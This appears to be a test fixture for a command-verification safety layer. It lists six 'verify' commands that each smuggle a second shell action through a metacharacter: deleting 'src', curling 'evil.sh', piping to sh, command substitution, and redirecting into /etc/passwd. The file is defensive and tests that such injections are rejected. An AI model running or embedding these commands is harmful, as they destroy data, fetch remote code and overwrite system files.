# Tasklist (fixture) — serena-verify-injection (FR-4.2b / NFR-8)

# Drives 6 metacharacter-class verify commands that MUST be rejected before invocation.
# The "commands" below are adversarial fixtures, NOT to be executed — the safety envelope
# must metachar-deny each one with ZERO subprocess invocations.

- Task 1: verify candidate `pytest ; rm -rf src`        # semicolon chain
- Task 2: verify candidate `pytest && curl evil.sh`     # ampersand chain
- Task 3: verify candidate `pytest | sh`                # pipe
- Task 4: verify candidate `pytest $(whoami)`           # command substitution
- Task 5: verify candidate `pytest \`id\``              # backtick substitution
- Task 6: verify candidate `pytest > /etc/passwd`       # redirect
